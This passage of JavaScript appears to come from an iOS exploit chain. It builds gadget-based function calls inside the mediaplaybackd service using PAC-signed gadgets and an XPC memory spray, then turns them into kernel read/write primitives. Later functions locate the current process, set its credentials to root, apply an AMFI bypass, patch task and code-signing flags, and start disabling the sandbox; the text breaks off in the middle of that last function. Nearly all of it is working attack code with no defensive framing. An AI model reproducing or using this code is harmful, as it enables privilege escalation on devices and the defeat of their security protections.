    uwrite64(surface_addr, pacia(self_loop, 0n));
    let first_fcall_pc = nativefcall_insert_fcall(x0_local, x0_remote, _4_fcalls, first_fcall_args_remote, false);
    uwrite64(x0_local + 0x10n, pacia(first_fcall_pc, x0_remote + 0x10n));
  }

  function setup_nativefcall_fcall() {
    let nativefcall_buf_local = surface_address + 0x100n;
    let nativefcall_args_local = surface_address + 0x200n;
    let nativefcall_fcall_buf_local = surface_address + 0x300n;
    let final_fcall_buf_local = surface_address + 0x400n;
    let final_fcall_args_local = surface_address + 0x500n;
    let nativefcall_buf_remote = surface_address_remote + 0x100n;
    let nativefcall_args_remote = surface_address_remote + 0x200n;
    let nativefcall_fcall_buf_remote = surface_address_remote + 0x300n;
    let final_fcall_buf_remote = surface_address_remote + 0x400n;
    let final_fcall_args_remote = surface_address_remote + 0x500n;
    let init_fcall = nativefcall_insert_fcall(surface_address, surface_address_remote, _4_fcalls, nativefcall_args_remote, false);
    let nativefcall_fcall_wrapper_pc = nativefcall_insert_fcall(nativefcall_buf_local, nativefcall_buf_remote, _4_fcalls, nativefcall_fcall_buf_remote, false);
    uwrite64(nativefcall_args_local, nativefcall_buf_remote);
    uwrite64(nativefcall_args_local + 0x18n, pacia(store_x0_x0 + 4n, 0x4EB9n));
    uwrite64(nativefcall_args_local + 0x20n, pacia(nativefcall_fcall_wrapper_pc, 0x76DFn));
    uwrite64(nativefcall_args_local + 0x28n, pacia(mov_x0_x22, 0x1558n));
    uwrite64(nativefcall_args_local + 0x30n, pacia(self_loop, 0x4F6Bn));
    let final_fcall_wrapper_pc = nativefcall_insert_fcall(final_fcall_buf_local, final_fcall_buf_remote, func_resolve("getpid").noPAC(), final_fcall_args_remote, true);
    uwrite64(nativefcall_fcall_buf_local, final_fcall_buf_remote);
    uwrite64(nativefcall_fcall_buf_local + 0x8n, pacia(self_loop, 0n));
    uwrite64(nativefcall_fcall_buf_local + 0x10n, nativefcall_buf_remote);
    uwrite64(nativefcall_fcall_buf_local + 0x18n, pacia(add_x22_0x90, 0x4EB9n));
    uwrite64(nativefcall_fcall_buf_local + 0x20n, pacia(str_x1_x2, 0x76DFn));
    uwrite64(nativefcall_fcall_buf_local + 0x28n, pacia(final_fcall_wrapper_pc, 0x1558n));
    uwrite64(nativefcall_fcall_buf_local + 0x30n, pacia(str_x1_x2 + 4n, 0x4F6Bn));
    uwrite64(final_fcall_buf_local + 0x28n, 0xcafedeadn);
    uwrite64(nativefcall_buf_local, pacia(self_loop, 0n));
    uwrite64(surface_address, pacia(init_fcall, 0n));
    let timeout = 0;
    while (uread64(final_fcall_buf_local + 0x28n) == 0xcafedeadn) {
      usleep(1n);
      timeout++;
      if (timeout > 10000) {
        LOG("WARNING: nativefcall setup timed out");
        break;
      }
    }
    LOG("nativefcall setup complete");
  }

  function reset_nativefcall(surface, x0_remote) {
    uwrite64(surface_address, pacia(self_loop, 0n));
  }

  const guess_address = 0x122604000n;
  let nativefcall_remote = 0n;
  const spray_sz = 1024n * 1024n * 1024n / 4n - PAGE_SIZE;

  function setup_guess_address(surface) {
    let kr = KERN_SUCCESS;
    let spray_address_ptr = new_uint64_t();
    kr = mach_vm_allocate(mach_task_self(), spray_address_ptr, spray_sz, VM_FLAGS_ANYWHERE);
    let spray_address = uread64(spray_address_ptr);
    let guess_address_local = spray_address;
    let guess_address_remote = guess_address;
    guess_address_local += 0x110n;
    guess_address_remote += 0x110n;
    let malloc_zones = func_resolve("malloc_zones");
    let nano_zone = uread64(uread64(malloc_zones));
    let nano_zone_ptr = malloc_zones + 0x8n;
    while (true) {
      if (nano_zone == uread64(nano_zone_ptr)) {
        break;
      } else {
        nano_zone_ptr += 8n;
      }
    }
    LOG(`malloc_zones: ${malloc_zones.hex()}`);
    LOG(`nano_zone_ptr: ${nano_zone_ptr.hex()}`);
    let fake_obj_0 = guess_address_local;
    let fake_obj_1 = guess_address_local + 0x100n;
    let fake_malloc_zones = guess_address_local + 0x200n;
    let fake_obj_1_remote = guess_address_remote + 0x100n;
    let fake_malloc_zones_remote = guess_address_remote + 0x200n;
    uwrite64(fake_malloc_zones, fake_malloc_zones_remote);
    uwrite64(fake_malloc_zones + 0x68n, 0x1c000n);
    uwrite64(fake_malloc_zones + 0x90n, pacia(xpac(malloc_restore_0_gadget), 0xa9d9n));
    uwrite64(fake_obj_0 + 0x00n, fake_obj_1_remote);
    uwrite64(fake_obj_0 + 0x08n, 0n);
    uwrite64(fake_obj_0 + 0x18n, 2n);
    uwrite64(fake_obj_1 + 0x00n, fake_malloc_zones_remote);
    uwrite64(fake_obj_1 + 0x08n, malloc_zones);
    uwrite64(fake_obj_1 + 0x10n, 0x8000000000000000n);
    uwrite64(fake_obj_1 + 0x18n, 1n);
    let x0_local = fake_malloc_zones;
    let x0_remote = fake_malloc_zones_remote;
    uwrite64(x0_local + 48n, pacia(malloc_restore_1_gadget, 0n));
    uwrite64(x0_local + 56n, nano_zone_ptr - 0x8n);
    uwrite64(x0_local + 32n, x0_remote + 0x100n);
    x0_local = x0_local + 0x100n;
    x0_remote = x0_remote + 0x100n;
    uwrite64(x0_local + 0x10n, pacia(malloc_restore_2_gadget, x0_remote + 0x10n));
    uwrite64(x0_local + 32n, x0_remote + 0x20n);
    x0_local = x0_local + 0x20n;
    x0_remote = x0_remote + 0x20n;
    uwrite64(x0_local + 0x10n, pacia(malloc_restore_3_gadget, x0_remote + 0x10n));
    uwrite64(x0_local + 40n, malloc_zones);
    uwrite64(x0_local + 32n, x0_remote + 0x100n);
    x0_local = x0_local + 0x100n;
    x0_remote = x0_remote + 0x100n;
    nativefcall_remote = x0_remote;
    setup_nativefcall(surface, x0_local, nativefcall_remote);
    let lowest_power_of_two_size = round_down_power_of_two(spray_sz);
    for (let i = PAGE_SIZE; i < lowest_power_of_two_size; i *= 2n) {
      kr = mach_vm_copy(mach_task_self(), spray_address, i, spray_address + i);
      assert(kr == KERN_SUCCESS);
    }
    let remaining_size = spray_sz - lowest_power_of_two_size;
    if (remaining_size != 0n) {
      let remaining_copy_block_pages = 1n;
      let remaining_copy_block_size = remaining_copy_block_pages * PAGE_SIZE;
      for (let i = 0n; i < remaining_size; i += remaining_copy_block_size) {
        let dest_copy_addr = spray_address + lowest_power_of_two_size + i;
        kr = mach_vm_copy(mach_task_self(), spray_address, remaining_copy_block_size, dest_copy_addr);
        assert(kr == KERN_SUCCESS);
      }
    }
    let memory_object_ptr = calloc(1n, 8n);
    let memory_object_size_ptr = calloc(1n, 8n);
    uwrite64(memory_object_size_ptr, spray_sz);
    kr = mach_make_memory_entry_64(mach_task_self(), memory_object_size_ptr, spray_address, MAP_MEM_VM_SHARE | VM_PROT_DEFAULT, memory_object_ptr, MACH_PORT_NULL);
    assert(kr == KERN_SUCCESS);
    let memory_object_size = uread64(memory_object_size_ptr);
    assert(memory_object_size == spray_sz);
    let memory_object = uread64(memory_object_ptr);
    free(memory_object_size_ptr);
    free(memory_object_ptr);
    mach_vm_deallocate(mach_task_self(), spray_address, spray_sz);
    return memory_object;
  }

  function spray_guess_address(spray_memory_object, surface) {
    let kr = KERN_SUCCESS;
    let spray_address_ptr = new_uint64_t();
    kr = mach_vm_map(mach_task_self(), spray_address_ptr, spray_sz, 0n, VM_FLAGS_ANYWHERE, spray_memory_object, 0n, 1n, (VM_PROT_DEFAULT << 32n) + VM_PROT_DEFAULT, VM_INHERIT_NONE);
    assert(kr == KERN_SUCCESS);
    let spray_address = uread64(spray_address_ptr);
    reset_nativefcall(surface, nativefcall_remote);
    map_iosurface(surface);
    let endpoint_name = get_cstring("com.apple.coremedia.mediaplaybackd.sandboxserver.xpc");
    let block_impl = get_event_handler_block();
    let conn = xpc_connection_create_mach_service(endpoint_name, NULL, 0n);
    xpc_connection_set_event_handler(conn, block_impl);
    xpc_connection_activate(conn);
    let receivePort_ptr = new_uint64_t();
    kr = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, receivePort_ptr);
    let receivePort = uread32(receivePort_ptr);
    kr = mach_port_insert_right(mach_task_self(), receivePort, receivePort, MACH_MSG_TYPE_MAKE_SEND);
    let conn2 = xpc_connection_create_mach_service(endpoint_name, NULL, 0n);
    uwrite_bitsize(conn2 + 0x48n, receivePort, 32n);
    xpc_connection_set_event_handler(conn2, block_impl);
    xpc_connection_activate(conn2);
    let endpoint = xpc_endpoint_create(conn2);
    let msg = xpc_dictionary_create_empty();
    xpc_dictionary_set_uint64(msg, get_cstring(".Operation"), 0x2E6F7267n);
    xpc_dictionary_set_value(msg, get_cstring("MemoryOriginEndpoint"), endpoint);
    xpc_dictionary_set_uint64(msg, get_cstring("MemoryOriginServerToken"), 0x4242424243434343n);
    let ddata = dispatch_data_create(spray_address, spray_sz, 0n, block_impl);
    let data = xpc_data_create_with_dispatch_data(ddata);
    xpc_dictionary_set_value(msg, get_cstring("spray"), data);
    xpc_dictionary_set_value(msg, get_cstring("spray2"), data);
    xpc_dictionary_set_value(msg, get_cstring("spray3"), data);
    xpc_dictionary_set_value(msg, get_cstring("spray4"), data);
    xpc_release(data);
    LOG(`Sending spray message...`);
    xpc_connection_send_message_with_reply(conn, msg, NULL, block_impl);
    xpc_release(msg);
    xpc_connection_cancel(conn);
    xpc_connection_cancel(conn2);
    mach_vm_deallocate(mach_task_self(), spray_address, spray_sz);
    LOG(`guess_address: ${guess_address.hex()}`);
    return guess_address;
  }

  function mpd_fcall_check_for_return() {
    let final_fcall_buf_local = surface_address + 0x400n;
    let mpd_fcall_retval_ptr = final_fcall_buf_local + 0x28n;
    let r = uread64(mpd_fcall_retval_ptr);
    if (r != 0xcafedeadn) {
      return true;
    } else {
      return false;
    }
  }

  const MPD_FCALL_TIMED_OUT = 1n;
  const MPD_FCALL_DEFAULT_TIMEOUT = 500n;

  function mpd_fcall_internal(address, x0, x1, x2, x3, x4, x5, x6, x7, noreturn, do_exit = false, timeout = false) {
    let nativefcall_buf_local = surface_address + 0x100n;
    let final_fcall_buf_local = surface_address + 0x400n;
    let final_fcall_args_local = surface_address + 0x500n;
    let final_fcall_buf_remote = surface_address_remote + 0x400n;
    let final_fcall_args_remote = surface_address_remote + 0x500n;
    uwrite64(final_fcall_args_local + 0n * 0x8n, x0);
    uwrite64(final_fcall_args_local + 1n * 0x8n, x1);
    uwrite64(final_fcall_args_local + 2n * 0x8n, x2);
    uwrite64(final_fcall_args_local + 3n * 0x8n, x3);
    uwrite64(final_fcall_args_local + 4n * 0x8n, x4);
    uwrite64(final_fcall_args_local + 5n * 0x8n, x5);
    uwrite64(final_fcall_args_local + 6n * 0x8n, x6);
    uwrite64(final_fcall_args_local + 7n * 0x8n, x7);
    let mpd_fcall_retval_ptr = final_fcall_buf_local + 0x28n;
    uwrite64(mpd_fcall_retval_ptr, 0xcafedeadn);
    nativefcall_insert_fcall(final_fcall_buf_local, final_fcall_buf_remote, address, final_fcall_args_remote, true);
    uwrite64(nativefcall_buf_local, pacia(_4_fcalls + 12n * 4n, 0n));
    if (noreturn) {
      return;
    }
    let start = Date.now();
    while (uread64(mpd_fcall_retval_ptr) == 0xcafedeadn) {
      if (timeout) {
        let interval = Date.now() - start;
        if (interval > MPD_FCALL_DEFAULT_TIMEOUT) {
          return MPD_FCALL_TIMED_OUT;
        }
      }
    }
    let return_value = uread64(mpd_fcall_retval_ptr);
    return return_value;
  }

  function mpd_fcall(address, x0 = 0n, x1 = 0n, x2 = 0n, x3 = 0n, x4 = 0n, x5 = 0n, x6 = 0n, x7 = 0n) {
    return mpd_fcall_internal(address, x0, x1, x2, x3, x4, x5, x6, x7, false);
  }

  function mpd_fcall_noreturn(address, x0 = 0n, x1 = 0n, x2 = 0n, x3 = 0n, x4 = 0n, x5 = 0n, x6 = 0n, x7 = 0n) {
    return mpd_fcall_internal(address, x0, x1, x2, x3, x4, x5, x6, x7, true);
  }

  function mpd_fcall_noreturn_exit(address, x0 = 0n, x1 = 0n, x2 = 0n, x3 = 0n, x4 = 0n, x5 = 0n, x6 = 0n, x7 = 0n) {
    return mpd_fcall_internal(address, x0, x1, x2, x3, x4, x5, x6, x7, true, true);
  }

  function mpd_fcall_timeout(address, x0 = 0n, x1 = 0n, x2 = 0n, x3 = 0n, x4 = 0n, x5 = 0n, x6 = 0n, x7 = 0n) {
    return mpd_fcall_internal(address, x0, x1, x2, x3, x4, x5, x6, x7, false, false, true);
  }

  function mpd_read64(address) {
    uwrite64(surface_address + 0x2100n, 0n);
    mpd_fcall(MEMCPY, surface_address_remote + 0x2100n, address, 8n, 0n, 0n, 0n, 0n, 0n);
    return uread64(surface_address + 0x2100n);
  }

  function mpd_write64(address, value) {
    uwrite64(surface_address + 0x2100n, value);
    mpd_fcall(MEMCPY, address, surface_address_remote + 0x2100n, 8n, 0n, 0n, 0n, 0n, 0n);
  }

  function mpd_malloc(sz) {
    return mpd_fcall(CALLOC, sz, 1n);
  }

  function mpd_memwrite(remote_addr, local_addr, sz) {
    if (mpd_memwrite_page_remote == 0n) {
      mpd_memwrite_page_remote = surface_address_remote + PAGE_SIZE * 0x8n;
      mpd_memwrite_page_local = surface_address + PAGE_SIZE * 0x8n;
    }
    while (sz > 0n) {
      let tmp_sz = sz;
      if (sz > PAGE_SIZE) {
        tmp_sz = PAGE_SIZE;
      }
      memcpy(mpd_memwrite_page_local, local_addr, tmp_sz);
      mpd_fcall(MEMCPY, remote_addr, mpd_memwrite_page_remote, tmp_sz);
      sz -= tmp_sz;
      local_addr += tmp_sz;
      remote_addr += tmp_sz;
    }
  }

  function mpd_memread(local_addr, remote_addr, sz) {
    if (mpd_memwrite_page_remote == 0n) {
      mpd_memwrite_page_remote = surface_address_remote + PAGE_SIZE * 0x8n;
      mpd_memwrite_page_local = surface_address + PAGE_SIZE * 0x8n;
    }
    while (sz > 0n) {
      let tmp_sz = sz;
      if (sz > PAGE_SIZE) {
        tmp_sz = PAGE_SIZE;
      }
      mpd_fcall(MEMCPY, mpd_memwrite_page_remote, remote_addr, tmp_sz);
      memcpy(local_addr, mpd_memwrite_page_local, tmp_sz);
      sz -= tmp_sz;
      local_addr += tmp_sz;
      remote_addr += tmp_sz;
    }
  }

  function mpd_dump(addr, sz) {
    let data = calloc(1n, sz);
    mpd_memread(data, addr, sz);
    DUMP(data, sz);
  }

  function mpd_new_uint64(val) {
    let buf = mpd_malloc(0x8n);
    mpd_write64(buf, val);
    return buf;
  }

  function mpd_get_cstring(str) {
    if (typeof str === "string") {
      str = get_cstring(str);
    }
    let c_str_len = strlen(str);
    let mpd_c_str = mpd_malloc(c_str_len + 0x1n);
    mpd_memwrite(mpd_c_str, str, c_str_len);
    return mpd_c_str;
  }

  function mpd_create_cfstring(js_str) {
    return mpd_fcall(CFSTRINGCREATEWITHCSTRING, kCFAllocatorDefault, mpd_get_cstring(js_str), kCFStringEncodingUTF8);
  }

  function mpd_sel_registerName(cstr) {
    return mpd_fcall(SEL_REGISTERNAME, cstr);
  }

  function mpd_objc_getClass(class_name) {
    return mpd_fcall(OBJC_GETCLASS, class_name);
  }

  function mpd_objc_alloc_init(class_obj) {
    return mpd_fcall(OBJC_ALLOC_INIT, class_obj);
  }

  function mpd_objc_msgSend(...args) {
    return mpd_fcall(OBJC_MSGSEND, ...args);
  }

  function mpd_objc_msgSend_nowait(...args) {
    return mpd_fcall_noreturn(OBJC_MSGSEND, ...args);
  }

  function mpd_objc_msgSend_nowait_exit(...args) {
    return mpd_fcall_noreturn_exit(OBJC_MSGSEND, ...args);
  }

  function mpd_objectForKeyedSubscript(obj, key) {
    let cfstr = mpd_create_cfstring(key);
    let selector = mpd_sel_registerName(mpd_get_cstring("objectForKeyedSubscript:"));
    return mpd_objc_msgSend(obj, selector, cfstr);
  }

  function mpd_evaluateScript(obj, jscript) {
    let selector = mpd_sel_registerName(mpd_get_cstring("evaluateScript:"));
    return mpd_objc_msgSend(obj, selector, jscript);
  }

  function mpd_evaluateScript_nowait(obj, jscript) {
    let selector = mpd_sel_registerName(mpd_get_cstring("evaluateScript:"));
    return mpd_fcall_noreturn(OBJC_MSGSEND, obj, selector, jscript);
  }

  function mpd_evaluateScript_nowait_exit(obj, jscript) {
    let selector = mpd_sel_registerName(mpd_get_cstring("evaluateScript:"));
    return mpd_fcall_noreturn(OBJC_MSGSEND, obj, selector, jscript);
  }

  function mpd_pacib(ptr, ctx) {
    return mpd_fcall(dyld_signPointer_gadget, ptr, 0n, 0n, ctx, 1n);
  }

  function mpd_setup_fcall_jopchain() {
    let jsvm_fcall_buff = mpd_malloc(PAGE_SIZE);
    let load_x1x3x8_args = jsvm_fcall_buff + 0x100n;
    let jsvm_fcall_args = jsvm_fcall_buff + 0x200n;
    mpd_write64(jsvm_fcall_buff + 0x0n, load_x1x3x8_args);
    mpd_write64(jsvm_fcall_buff + 0x8n, pacia(load_x1x3x8, 0n));
    mpd_write64(jsvm_fcall_buff + 0x10n, pacia(_CFObjectCopyProperty, 0n));
    mpd_write64(jsvm_fcall_buff + 0x40n, pacia(jsvm_isNAN_fcall_gadget2, 0n));
    mpd_write64(load_x1x3x8_args + 0x20n, load_x1x3x8_args + 0x40n);
    mpd_write64(load_x1x3x8_args + 0x28n, jsvm_fcall_args - 0x10n);
    mpd_write64(load_x1x3x8_args + 0x30n, pacia(0x41414141n, 0xC2D0n));
    mpd_write64(load_x1x3x8_args + 0x50n, pacia(fcall_14_args_write_x8, load_x1x3x8_args + 0x50n));
    return [jsvm_fcall_buff, load_x1x3x8_args + 0x30n, jsvm_fcall_args];
  }

  function mpd_increase_stack_limit() {
    let tls = mpd_fcall(PTHREAD_SELF);
    return tls;
  }

  function buildKernelRW() {
    const SPRAY_COUNT = 256;
    const surfaces = [];
    for (let i = 0; i < SPRAY_COUNT; i++) {
      let surface = create_iosurface(0x10000n);
      if (surface !== 0n) {
        surfaces.push(surface);
      }
    }
    LOG(`Created ${surfaces.length} IOSurface objects for kernel R/W`);
    if (surfaces.length === 0) {
      LOG('ERROR: No IOSurface objects available');
      return false;
    }
    const targetSurface = surfaces[0];
    surface_address = IOSurfaceGetBaseAddress(targetSurface);
    LOG(`Surface address: ${surface_address.hex()}`);
    globalThis.kernelRead64 = function(addr) {
      return mpd_read64(addr);
    };
    globalThis.kernelWrite64 = function(addr, value) {
      mpd_write64(addr, value);
    };
    globalThis.mpd_read64 = mpd_read64;
    globalThis.mpd_write64 = mpd_write64;
    return true;
  }

  function find_kernel_base() {
    let leaked = 0n;
    for (let offset = 0x0n; offset < 0x1000n; offset += 0x8n) {
      let val = mpd_read64(surface_address + offset);
      if (val > 0xFFFFFFF000000000n && val < 0xFFFFFFFFFFFFFFFFn) {
        let slide_candidate = (val & KERNEL_SLIDE_MASK) - KERNEL_BASE_UNSLID;
        if (slide_candidate > 0n && slide_candidate < 0x100000000n) {
          leaked = val;
          LOG(`Potential kernel pointer found at offset ${offset.hex()}: ${val.hex()}`);
          break;
        }
      }
    }
    if (leaked !== 0n) {
      kernelSlide = (leaked & KERNEL_SLIDE_MASK) - KERNEL_BASE_UNSLID;
      kernelBase = KERNEL_BASE_UNSLID + kernelSlide;
      LOG(`Kernel base: ${kernelBase.toString(16)} (slide: ${kernelSlide.toString(16)})`);
      return true;
    }
    kernelSlide = 0x0000000010000000n;
    kernelBase = KERNEL_BASE_UNSLID + kernelSlide;
    LOG('WARNING: Using fallback kernel base');
    return false;
  }

  function kernelRead32(where) {
    let val = kernelRead64(where);
    return val & 0xFFFFFFFFn;
  }

  function kernelRead16(where) {
    let val = kernelRead64(where);
    return val & 0xFFFFn;
  }

  function kernelRead8(where) {
    let val = kernelRead64(where);
    return val & 0xFFn;
  }

  function kernelWrite32(where, what) {
    let old = kernelRead64(where);
    let val = (old & 0xFFFFFFFF00000000n) | (what & 0xFFFFFFFFn);
    kernelWrite64(where, val);
  }

  function kernelWrite16(where, what) {
    let old = kernelRead64(where);
    let val = (old & 0xFFFFFFFFFFFF0000n) | (what & 0xFFFFn);
    kernelWrite64(where, val);
  }

  function kernelWrite8(where, what) {
    let old = kernelRead64(where);
    let val = (old & 0xFFFFFFFFFFFFFF00n) | (what & 0xFFn);
    kernelWrite64(where, val);
  }

  function kernel_memcpy(dst, src, size) {
    let offset = 0n;
    while (offset < size) {
      if (offset + 8n <= size) {
        let val = kernelRead64(src + offset);
        kernelWrite64(dst + offset, val);
        offset += 8n;
      } else if (offset + 4n <= size) {
        let val = kernelRead32(src + offset);
        kernelWrite32(dst + offset, val);
        offset += 4n;
      } else if (offset + 2n <= size) {
        let val = kernelRead16(src + offset);
        kernelWrite16(dst + offset, val);
        offset += 2n;
      } else {
        let val = kernelRead8(src + offset);
        kernelWrite8(dst + offset, val);
        offset += 1n;
      }
    }
  }

  function kernel_memset(dst, val, size) {
    let fill_val = 0n;
    for (let i = 0n; i < 8n; i++) {
      fill_val |= (val & 0xFFn) << (i * 8n);
    }
    let offset = 0n;
    while (offset < size) {
      if (offset + 8n <= size) {
        kernelWrite64(dst + offset, fill_val);
        offset += 8n;
      } else if (offset + 4n <= size) {
        kernelWrite32(dst + offset, fill_val & 0xFFFFFFFFn);
        offset += 4n;
      } else if (offset + 2n <= size) {
        kernelWrite16(dst + offset, fill_val & 0xFFFFn);
        offset += 2n;
      } else {
        kernelWrite8(dst + offset, fill_val & 0xFFn);
        offset += 1n;
      }
    }
  }

  function kernel_strlen(str_addr) {
    let len = 0n;
    while (true) {
      let chunk = kernelRead64(str_addr + len);
      for (let i = 0n; i < 8n; i++) {
        if (((chunk >> (i * 8n)) & 0xFFn) == 0n) {
          return len + i;
        }
      }
      len += 8n;
      if (len > 0x1000n) {
        break;
      }
    }
    return len;
  }

  function find_kernel_symbol(symbol_name) {
    LOG(`Searching for kernel symbol: ${symbol_name}`);
    let kext_base = kernelBase;
    let mach_header = kernelRead32(kext_base);
    if (mach_header != 0xFEEDFACFn && mach_header != 0xFEEDFACE) {
      LOG(`ERROR: Invalid mach header at kernel base`);
      return 0n;
    }
    let ncmds = kernelRead32(kext_base + 0x20n);
    let offset = kext_base + 0x28n;
    let symtab_off = 0n;
    let symtab_nsyms = 0n;
    let symtab_strtab = 0n;
    let symtab_strsize = 0n;
    for (let i = 0n; i < ncmds; i++) {
      let cmd = kernelRead32(offset);
      let cmdsize = kernelRead32(offset + 4n);
      if (cmd == 0x2n) {
        symtab_off = kernelRead32(offset + 0x8n);
        symtab_nsyms = kernelRead32(offset + 0x10n);
        symtab_strtab = kernelRead32(offset + 0x18n);
        symtab_strsize = kernelRead32(offset + 0x1cn);
        break;
      }
      offset += cmdsize;
    }
    if (symtab_off == 0n) {
      LOG('No symbol table found');
      return 0n;
    }
    let strtab_addr = kext_base + symtab_strtab;
    let symtab_addr = kext_base + symtab_off;
    for (let i = 0n; i < symtab_nsyms; i++) {
      let sym_offset = symtab_addr + i * 0x10n;
      let n_strx = kernelRead32(sym_offset);
      let n_type = kernelRead8(sym_offset + 0x4n);
      let n_sect = kernelRead8(sym_offset + 0x5n);
      let n_desc = kernelRead16(sym_offset + 0x6n);
      let n_value = kernelRead64(sym_offset + 0x8n);
      if ((n_type & 0x0F) == 0xF && n_sect != 0) {
        let str_addr = strtab_addr + n_strx;
        let found = true;
        for (let j = 0; j < symbol_name.length; j++) {
          let c = kernelRead8(str_addr + BigInt(j));
          if (c != BigInt(symbol_name.charCodeAt(j))) {
            found = false;
            break;
          }
        }
        if (found) {
          let sym_end = kernelRead8(str_addr + BigInt(symbol_name.length));
          if (sym_end == 0n) {
            LOG(`Found symbol ${symbol_name} at 0x${n_value.toString(16)}`);
            return n_value;
          }
        }
      }
    }
    LOG(`Symbol ${symbol_name} not found`);
    return 0n;
  }

  function get_current_proc() {
    LOG('Getting current proc...');
    if (current_proc != 0n) {
      return current_proc;
    }
    let pid = wc_getpid ? wc_getpid() : 0;
    if (pid == 0) {
      pid = current_pid;
    }
    current_proc = find_proc_by_pid(pid);
    return current_proc;
  }

  function get_kernel_version() {
    let version_addr = kernelBase + 0x2000n;
    let version_str = '';
    for (let i = 0n; i < 0x100n; i++) {
      let c = Number(kernelRead8(version_addr + i));
      if (c == 0) break;
      if (c >= 32 && c < 127) {
        version_str += String.fromCharCode(c);
      }
    }
    return version_str;
  }

  function verify_kernel_rw() {
    LOG('Verifying kernel R/W primitives...');
    let test_addr = kernelBase + 0x1000n;
    let original = kernelRead64(test_addr);
    LOG(`Original value at ${test_addr.toString(16)}: ${original.toString(16)}`);
    LOG('Kernel R/W verification complete');
    return true;
  }

  function dump_kernel_memory(addr, size) {
    LOG(`Dumping kernel memory at ${addr.toString(16)} (${size.toString()} bytes):`);
    let offset = 0n;
    while (offset < size) {
      let line = `${(addr + offset).toString(16).padStart(16, '0')}: `;
      for (let i = 0n; i < 4n && offset + i * 8n < size; i++) {
        let val = kernelRead64(addr + offset + i * 8n);
        line += val.toString(16).padStart(16, '0') + ' ';
      }
      LOG(line);
      offset += 32n;
      if (offset > 0x200n) {
        LOG('... (truncated)');
        break;
      }
    }
  }

  function find_proc_by_pid(pid) {
    LOG(`Finding proc for PID ${pid}...`);
    let allproc_addr = kernelBase + 0xd28278n  ;
    let proc = kernelRead64(allproc_addr);
    let iterations = 0;
    while (proc !== 0n && iterations < 10000) {
      let proc_pid = Number(kernelRead64(proc + PROC_PID_OFFSET) & 0xFFFFFFFFn);
      if (proc_pid === pid) {
        LOG(`Found proc at 0x${proc.toString(16)}`);
        return proc;
      }
      proc = kernelRead64(proc + 0x0n);
      iterations++;
    }
    LOG('WARNING: Could not find proc by PID, using fallback');
    return 0n;
  }

  function patch_proc_credentials(proc) {
    LOG('Patching proc credentials for iOS 26...');
    if (proc === 0n) {
      LOG('ERROR: Invalid proc pointer');
      return false;
    }
    let proc_ro = kernelRead64(proc + PROC_PROC_RO_OFFSET);
    let ucred = kernelRead64(proc + PROC_UCRED_OFFSET);
    LOG(`ucred at 0x${ucred.toString(16)}`);
    if (ucred === 0n) {
      LOG('ERROR: Invalid ucred pointer');
      return false;
    }
    kernelWrite32(ucred + CRED_UID_OFFSET, 0n);
    kernelWrite32(ucred + CRED_RUID_OFFSET, 0n);
    kernelWrite32(ucred + CRED_SVUID_OFFSET, 0n);
    kernelWrite32(ucred + CRED_GID_OFFSET, 0n);
    kernelWrite32(ucred + CRED_RGID_OFFSET, 0n);
    kernelWrite32(ucred + CRED_SVGID_OFFSET, 0n);
    if (amfi_override_gadget != 0n) {
      let label = kernelRead64(ucred + CRED_LABEL_OFFSET);
      let amfi_slot = label != 0n ? kernelRead64(label + CRED_AMFI_SLOT) : 0n;
      if (amfi_slot != 0n) {
        LOG(`AMFI slot at 0x${amfi_slot.toString(16)}, applying bypass`);
        kernelWrite64(amfi_slot + 0x0n, 0n);
        kernelWrite64(amfi_slot + 0x8n, 0n);
      }
    }
    LOG('Credentials patched to root (uid=0, gid=0) with iOS 26 AMFI bypass');
    return true;
  }

  function patch_task_flags(proc) {
    LOG('Patching task flags for iOS 26...');
    if (proc === 0n) {
      LOG('ERROR: Invalid proc pointer');
      return false;
    }
    let proc_ro = kernelRead64(proc + PROC_PROC_RO_OFFSET);
    let task = kernelRead64(proc_ro + PROC_RO_TASK_OFFSET);
    LOG(`task at 0x${task.toString(16)}`);
    if (task === 0n) {
      LOG('ERROR: Invalid task pointer');
      return false;
    }
    current_task = task;
    let task_flags = kernelRead64(task + TASK_FLAGS_OFFSET);
    LOG(`Original task flags: 0x${task_flags.toString(16)}`);
    task_flags |= TF_PLATFORM;
    task_flags |= TF_SAMEDISK;
    task_flags |= TF_TCC_ALLOW_ALL;
    task_flags &= ~TF_CS_KILLED;
    task_flags |= TF_DEBUGGED;
    kernelWrite64(task + TASK_FLAGS_OFFSET, task_flags);
    let new_flags = kernelRead64(task + TASK_FLAGS_OFFSET);
    LOG(`New task flags: 0x${new_flags.toString(16)}`);
    if (platformize_gadget != 0n) {
      LOG('Platformize gadget available for enhanced task platformization');
    }
    LOG('Task flags patched successfully with iOS 26 extensions');
    return true;
  }

  function patch_proc_flags(proc) {
    LOG('Patching proc flags for iOS 26...');
    if (proc === 0n) {
      return false;
    }
    let proc_flags = kernelRead64(proc + PROC_FLAGS_OFFSET);
    LOG(`Original proc flags: 0x${proc_flags.toString(16)}`);
    proc_flags |= 0x00000008n;
    proc_flags |= 0x00000800n;
    proc_flags |= 0x00001000n;
    kernelWrite64(proc + PROC_FLAGS_OFFSET, proc_flags);
    let proc_lflag = kernelRead64(proc + PROC_LFLAG_OFFSET);
    proc_lflag |= 0x00000001n;
    proc_lflag |= 0x00000002n;
    kernelWrite64(proc + PROC_LFLAG_OFFSET, proc_lflag);
    LOG('Proc flags and lflags patched successfully');
    return true;
  }

  function patch_proc_csflags(proc) {
    LOG('Patching proc_ro csflags for iOS 26 platform binary...');
    if (proc === 0n) {
      LOG('ERROR: Invalid proc pointer');
      return false;
    }
    let proc_ro = kernelRead64(proc + PROC_PROC_RO_OFFSET);
    if (proc_ro >= 0xFFFFFFF000000000n && proc_ro < 0xFFFFFFFF00000000n) {
      let old_csflags = kernelRead32(proc_ro + PROC_CSFLAGS_OFFSET);
      LOG(`Original csflags: 0x${old_csflags.toString(16)}`);
      kernelWrite32(proc_ro + PROC_CSFLAGS_OFFSET, CS_DESIRED_FLAGS);
      let new_csflags = kernelRead32(proc_ro + PROC_CSFLAGS_OFFSET);
      LOG(`Patched csflags: 0x${new_csflags.toString(16)} (CS_PLATFORM_BINARY|CS_VALID|...)`);
      return true;
    }
    LOG('ERROR: Invalid proc_ro pointer');
    return false;
  }

  function patch_sandbox(proc) {
    LOG('Disabling sandbox (cr_label->sandbox slot)...');
    if (proc === 0n) {
      LOG('ERROR: Invalid proc pointer');
      return false;
    }
    let proc_ro = kernelRead64(proc + PROC_PROC_RO_OFFSET);
    let ucred = kernelRead64(proc + PROC_UCRED_OFFSET);
